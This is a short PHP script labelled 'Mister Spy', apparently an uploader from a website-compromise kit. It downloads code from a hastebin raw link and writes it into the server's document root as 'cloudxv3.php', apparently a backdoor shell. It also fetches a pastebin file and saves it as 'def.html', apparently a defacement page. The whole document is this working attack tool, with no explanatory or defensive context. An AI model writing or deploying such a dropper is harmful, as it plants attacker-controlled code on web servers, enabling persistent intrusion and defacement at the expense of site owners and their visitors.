Mister Spy
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/cloudxv3.php" ;
$text = http_get('https://hastebin.com/raw/kuvuyisije');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check3=$_SERVER['DOCUMENT_ROOT'] . "/def.html" ;
$text3 = http_get('https://pastebin.com/raw/Yban6vjw');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);


?>
